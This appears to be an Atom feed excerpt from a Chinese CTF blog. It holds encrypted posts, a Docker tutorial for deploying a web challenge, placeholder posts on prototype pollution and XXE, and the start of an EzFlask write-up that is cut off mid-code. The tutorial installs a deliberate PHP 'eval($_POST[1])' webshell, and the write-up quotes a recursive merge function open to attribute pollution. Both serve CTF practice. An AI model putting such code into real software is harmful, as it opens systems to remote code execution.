f0531f1629386d82c110f7f079944b88eb1d7d5b6c002a3693ca136aedda249441f8216264684e1d7c206cc92f3398706a52710ccd3fad585166526427df270b08deaaf54da8e881ffb787116148154ed6e8c70e935335a21e09e145fe5b099ed279bae3f3c2b0180afbf7664092e93102ce416201ee108b163d98aa1a080d2f53bcb6b6696e88f023b05eb9430b4b7ecc34d9589ef99f2f450cb45d1a4d82ddb53a4391919a6173709fe016b16119f374975972d9e4a5a3a92c7d485bfe8aea62ef4eaf655d4cf34f83ce404a6bb8b93a5de9e46a4acdb9d9f64afa208de2712a7e01ea547c83406859d4ea32748b350db5b936c60f49d68c64ed613e905f3087978c833834de377b267fd86a253c3da29658b4371a65d92df291d2cb444e359df723c348a330d00d124f1be778d89fd3b0a5df138079244239364e1aed51f60c4514e81460e809f059107c80edcc8ce07fc78328d5abdffd041a1f02983c6274b5fea10073001d3feb071c59fb9085c5767113db4698b3caf12259287941c6d4c3dfac2b174220680a3d768c8c77eedcc73e13add04a490a6b919a4e1e3891c65d8e685b2d820c5f76134ba89a68bd2847b020330c5721409f7748bdd30ad38fef6386658ecffb320bae2106cd9d487ffb5caf595e92f36ebcadcaa7768a3bc6f25a2ab935f5269dd2a1185a85a7b03e7d80c487726b7abcf42da409ec0f3212ed0292332237fed998ab9782acbcddf4f03e3ad1a68f106e8d11b15f1efe294c3a9cdabb048ff66f860864f308ad8627a9cf5e0762cada25ff3e2747af04f06758f258d93253425f60daf63a9e09803c460102d9661f2a39f4bfcb9ac3e4077a31818c520ebc1004e8bad03537ca2435b97a5a411bfa95402f24782823d20a28770d75406f3a9d5899eef94f30c6d742ed95da00b7daf48de9e8eb743712e41eec067710e48368bf3122322acab03058821b848de98d3e506b2e90ff95466a1f256a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Java" scheme="https://ke1nys.github.io/tags/show-Java/"/>
    
  </entry>
  
  <entry>
    <title>show-Nodejs污染</title>
    <link href="https://ke1nys.github.io/posts/bb258da4.html"/>
    <id>https://ke1nys.github.io/posts/bb258da4.html</id>
    <published>2023-08-02T12:01:56.000Z</published>
    <updated>2023-08-17T09:33:39.341Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="002b0ee2c18d22730468acf2015e92289c83047ce6da97b64263cefb34958d12"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Nodejs污染" scheme="https://ke1nys.github.io/tags/show-Nodejs%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>Docker-学习</title>
    <link href="https://ke1nys.github.io/posts/75581288.html"/>
    <id>https://ke1nys.github.io/posts/75581288.html</id>
    <published>2023-07-31T03:16:07.000Z</published>
    <updated>2023-08-17T09:33:39.338Z</updated>
    
    <content type="html"><![CDATA[<p>这里写这个的话主要是为了记录这个<strong>学习<code>docker</code>的过程</strong></p><p><a href="https://blog.csdn.net/YBaog/article/details/125349766">参考文章1</a></p><p><a href="https://www.zeker.top/posts/f7e6aba0/#%E4%BA%94%E3%80%81Docker-compose">参考文章2</a></p><p><strong>docker安装方式自行google 很快就能安装好了</strong></p><p>(<strong>之前只是简单的了解了一下docker  没咋用过 现在开始学习后才发现docker的强大</strong>)</p><ul><li>ubuntu </li><li>nginx </li><li>php7.4-fpm</li></ul><p>以上就是要用到地东西</p><h3 id="拉取ubuntu镜像"><a href="#拉取ubuntu镜像" class="headerlink" title="拉取ubuntu镜像"></a>拉取ubuntu镜像</h3><p><code>docker pull ubuntu</code>    (不指定版本地话都是拉取最新的版本)</p><p>或者在Docker-desktop  里面搜索下载也是可以的</p><p><img src="../images/image-20230731141029597.png" alt="image-20230731141029597"></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="keyword">run</span><span class="language-bash"> -it -p 8080:80 --name=ctf ubuntu(镜像ID)</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit   //是退出</span><br></pre></td></tr></table></figure><p>启动一个已停止的容器：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker start b750bbbcfd88 (镜像ID)</span><br></pre></td></tr></table></figure><p>进入容器</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker attach b750bbbcfd88 (镜像ID)</span><br><span class="line">或者</span><br><span class="line">docker exec -it b750bbbcfd88 /bin/bash</span><br></pre></td></tr></table></figure><h3 id="安装nginx"><a href="#安装nginx" class="headerlink" title="安装nginx"></a>安装nginx</h3><p>这里的话直接是在<code>Ubuntu</code>里进行安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y nginx    //-y  是全部默认的意思</span><br></pre></td></tr></table></figure><p><strong><code>nginx</code>命令</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关闭</span></span><br><span class="line"><span class="attribute">service</span> nginx stop</span><br><span class="line"><span class="comment"># 开启</span></span><br><span class="line">service nginx start</span><br><span class="line"><span class="comment"># 状态</span></span><br><span class="line">service nginx status</span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">service nginx restart</span><br></pre></td></tr></table></figure><h3 id="安装php"><a href="#安装php" class="headerlink" title="安装php"></a>安装php</h3><p>这里我选择的是<code>php7.4</code>版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">apt-get install -y software-properties-common</span><br><span class="line"></span><br><span class="line">add-apt-repository ppa:ondrej/php</span><br><span class="line"># 出现暂停，按回车键[ENTER]</span><br><span class="line"></span><br><span class="line">apt-get update</span><br><span class="line"></span><br><span class="line">apt-get install -y php7.4-fpm</span><br><span class="line"># 必须得是按照顺序来</span><br></pre></td></tr></table></figure><p>php7.4-fpm-命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 关闭</span><br><span class="line">service php7.4-fpm stop</span><br><span class="line"># 开启</span><br><span class="line">service php7.4-fpm start</span><br><span class="line"># 状态</span><br><span class="line">service php7.4-fpm status</span><br><span class="line"># 重启</span><br><span class="line">service php7.4-fpm restart</span><br></pre></td></tr></table></figure><h3 id="安装Vim"><a href="#安装Vim" class="headerlink" title="安装Vim"></a>安装Vim</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt install -y vim</span><br></pre></td></tr></table></figure><h3 id="环境配置与搭建"><a href="#环境配置与搭建" class="headerlink" title="环境配置与搭建"></a>环境配置与搭建</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/nginx/sites-available/default</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230731142244821.png" alt="image-20230731142244821"></p><p>添加<code>index.php</code> 并且把下面指定的代码取消注释</p><h4 id="启动nginx和php服务"><a href="#启动nginx和php服务" class="headerlink" title="启动nginx和php服务"></a>启动nginx和php服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 检查 nginx 配置文件</span><br><span class="line">nginx -t</span><br><span class="line"># 重启 nginx</span><br><span class="line">service nginx restart </span><br><span class="line"># 启动 php7.4-fpm</span><br><span class="line">service php7.4-fpm start </span><br></pre></td></tr></table></figure><p>这里的<code>nginx -t</code> 可以用来检查修改的配置是否修改正确  如果修改错误的话会报错提醒</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查看当前进程</span><br><span class="line">ps -aux</span><br><span class="line"># 查看 nginx 状态</span><br><span class="line">service nginx status </span><br><span class="line"># 查看 php7.4-fpm 状态</span><br><span class="line">service php7.4-fpm status </span><br></pre></td></tr></table></figure><p><strong>检查这个<code>nginx</code>和<code>php</code>服务的运行状态</strong></p><p>然后去访问一下开放的端口   看<code>nginx</code>是否在正常运行</p><p><img src="../images/image-20230731143616100.png" alt="image-20230731143616100"></p><p>那么我们就去修改该目录下的文件  让其显示我们想要显示的内容</p><p>(<strong>将该html文件删除</strong>)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /var/www/html/index.php</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">eval($_POST[1]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>将上述内容写入   然后去访问</p><p><img src="../images/image-20230731143820087.png" alt="image-20230731143820087"></p><p>成功写入    </p><p><strong>(假如这是我们要出的题目   那么我们就可以尝试去将其变成镜像  方便部署)</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br><span class="line">// .的意思是把当前目录下的文件都给打包</span><br><span class="line">// -t 后面是跟着镜像名字  :后面是标签   都可以自己定义</span><br></pre></td></tr></table></figure><p>在构造镜像之前 我们要编写<code>Dockerfile</code></p><p>(<strong>它的作用是能帮助我们起容器</strong>)</p><h4 id="编写Dockerfile和docker-compose-yml"><a href="#编写Dockerfile和docker-compose-yml" class="headerlink" title="编写Dockerfile和docker-compose.yml"></a>编写Dockerfile和docker-compose.yml</h4><p>写这个的目的就是为了能帮助我们<strong>自动化部署环境</strong></p><p><strong>(例如就是自动安装<code>nginx</code>和<code>php</code>等等之类的工作)</strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu</span><br><span class="line"></span><br><span class="line"><span class="keyword">LABEL</span><span class="language-bash"> Author=<span class="string">&quot;Ke1nys&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#更新软件源</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt install nginx -y</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装php7.4-fpm</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y software-properties-common</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> add-apt-repository ppa:ondrej/php -y</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get install -y php7.4-fpm</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#删除nginx默认html文件</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">rm</span> /var/www/html/index.nginx-debian.html</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#将题目源码复制过去</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/index.php /var/www/html/</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/f1ag /</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./src/default /etc/nginx/sites-available/default</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> -R 755 /var/www/html/ &amp;&amp; \</span></span><br><span class="line"><span class="language-bash">    <span class="built_in">chown</span> -R root:root /var/www/html </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启用脚本</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> ./run.sh /root/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash">  <span class="built_in">chmod</span> +x /root/run.sh</span></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;/root/run.sh&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面注释都写的很清楚了</p><p>接着写一个<code>sh</code>文件来帮我们自动化开启<code>nginx</code>和<code>php</code></p><p><strong>run.sh</strong></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#! /bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#启动nginx</span></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动php</span></span><br><span class="line">service php7.4-fpm start</span><br><span class="line"></span><br><span class="line"><span class="comment"># # never exit，此处是为了运行完上条应用服务后，有对应的前台进程</span></span><br><span class="line"><span class="built_in">tail</span> -f /dev/null</span><br></pre></td></tr></table></figure><p>注释也是解释的很清楚了</p><p><strong><code>docker-compose.yml</code></strong></p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 指定该文件版本</span></span><br><span class="line">version: <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="comment"># 把每个子目录视为一个镜像，开始构建</span></span><br><span class="line">services:</span><br><span class="line">  src: <span class="comment">#这个是文件目录名</span></span><br><span class="line">    <span class="comment"># 此处仅允许 image, build, ports，禁止其他字段出现，如果有 volume，cmd 等设置需求，请在 Dockerfile 里进行文件拷贝或者申明。</span></span><br><span class="line">    image: ctf/test1        <span class="comment">#镜像名字</span></span><br><span class="line">    build: ./           <span class="comment">#build的位置，docker会去web1中的dockerfile开始搭建</span></span><br><span class="line">    <span class="comment"># restart: always</span></span><br><span class="line">    ports:</span><br><span class="line">      - <span class="string">&quot;8080:80&quot;</span>           <span class="comment">#设置映射的断口</span></span><br><span class="line">    environment:</span><br><span class="line">      - FLAG=flag&#123;this_is_test_flag&#125;                      <span class="comment"># 这里定义了flag,但是不会覆盖sh里的$FLAG</span></span><br><span class="line">    <span class="comment">#   - FLAG=flag&#123;$(cat /proc/sys/kernel/random/uuid)&#125;  # 获取容器的uuid作为flag 会报错</span></span><br></pre></td></tr></table></figure><p>注释也是写的很清楚了</p><p><code>dockerfile</code>和<code>docker-compose.yml</code>   要与这个源码里的文件名对应上  不然会报错</p><p><strong>最后完成的文件结构图</strong></p><p><img src="../images/image-20230731145619175.png" alt="image-20230731145619175"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -t ctf:v1 .   </span><br></pre></td></tr></table></figure><p><strong>生成镜像</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 -e 镜像id</span><br></pre></td></tr></table></figure><p>运行该镜像   </p><p>这样就能成功的将环境起起来了</p><h3 id="外网部署"><a href="#外网部署" class="headerlink" title="外网部署"></a>外网部署</h3><p>直接将文件发给自己的服务器上  然后执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>这样就可以将题目成功的部署在外网上了</p><p><img src="../images/image-20230731150347683.png" alt="image-20230731150347683"></p><p>(要记得开启题目所需的端口   不然可能会访问失败)</p><p><img src="../images/image-20230731150438136.png" alt="image-20230731150438136"></p><p>这样就部署成功了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里写这个的话主要是为了记录这个&lt;strong&gt;学习&lt;code&gt;docker&lt;/code&gt;的过程&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/YBaog/article/details/125349766&quot;&gt;参考文章1&lt;/a</summary>
      
    
    
    
    
    <category term="Docker" scheme="https://ke1nys.github.io/tags/Docker/"/>
    
  </entry>
  
  <entry>
    <title>show-Python反序列化</title>
    <link href="https://ke1nys.github.io/posts/78e9e0c1.html"/>
    <id>https://ke1nys.github.io/posts/78e9e0c1.html</id>
    <published>2023-07-29T15:34:42.000Z</published>
    <updated>2023-08-17T09:33:39.340Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="bfc3084065846ef3a57d7d0c25fc1a1dd0aa484ad8cccc2a82311f856c29a666"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这是一篇加密文章，需要密码才能继续阅读。</summary>
    
    
    
    
    <category term="show-Python反序列化" scheme="https://ke1nys.github.io/tags/show-Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Python原型链污染</title>
    <link href="https://ke1nys.github.io/posts/6893ad0d.html"/>
    <id>https://ke1nys.github.io/posts/6893ad0d.html</id>
    <published>2023-07-26T06:31:25.000Z</published>
    <updated>2023-07-29T08:13:42.299Z</updated>
    
    <content type="html"><![CDATA[<p>写这篇文章是为了占位  </p><p>因为比赛的时候刚好遇到这里不会</p><p><img src="../images/image-20230726143731499.png" alt="image-20230726143731499"></p><p><a href="https://tttang.com/archive/1876/#toc__1">python原型链污染详解</a></p><p><code>Web -EzFlask</code>    这道题考察到了  </p><p>关于这道题的解在博客直接搜索这个比赛的wp就能看到了</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为比赛的时候刚好遇到这里不会&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143731499.png&quot; alt=&quot;image-20230726143731499&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href</summary>
      
    
    
    
    
    <category term="Python原型链污染" scheme="https://ke1nys.github.io/tags/Python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    
  </entry>
  
  <entry>
    <title>XXE-xpath注入</title>
    <link href="https://ke1nys.github.io/posts/9d9aaae5.html"/>
    <id>https://ke1nys.github.io/posts/9d9aaae5.html</id>
    <published>2023-07-26T06:30:56.000Z</published>
    <updated>2023-07-29T08:13:42.300Z</updated>
    
    <content type="html"><![CDATA[<p>这里这篇文章是为了占位  </p><p>因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅</p><p><img src="../images/image-20230726143326525.png" alt="image-20230726143326525"></p><p><strong>考点是xxe的xpath盲注</strong>  </p><p><a href="https://www.cnblogs.com/backlion/p/8554749.html">xpath详解</a></p><p><a href="https://boogipop.com/2023/03/06/XXE%E6%B3%A8%E5%85%A5%E7%9A%84Remake%E4%B9%8B%E6%97%85/">xxe和xpath详解</a></p><p><code>WEB -MyPicDisk</code>       这道题考察到了</p><p>wp的话在这个比赛的wp上 </p><p>直接在博客上搜索就行</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这里这篇文章是为了占位  &lt;/p&gt;
&lt;p&gt;因为有个比赛考到了   刚好我不会  所以写篇文章来占位一下   方便下次自己好查阅&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;../images/image-20230726143326525.png&quot; alt=&quot;image-202307</summary>
      
    
    
    
    
    <category term="XXE-xpath注入" scheme="https://ke1nys.github.io/tags/XXE-xpath%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>DASCTF 2023 &amp; 0X401-Web</title>
    <link href="https://ke1nys.github.io/posts/46437d33.html"/>
    <id>https://ke1nys.github.io/posts/46437d33.html</id>
    <published>2023-07-25T06:51:45.000Z</published>
    <updated>2023-07-29T08:13:42.295Z</updated>
    
    <content type="html"><![CDATA[<h2 id="EzFlask"><a href="#EzFlask" class="headerlink" title="EzFlask"></a>EzFlask</h2><p><a href="https://tttang.com/archive/1876/#toc_object">python原型链污染</a></p><p><img src="../images/image-20230725145530694.png" alt="image-20230725145530694"></p><p><strong>提供源码  开始审计</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        self.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> self.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> self.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span 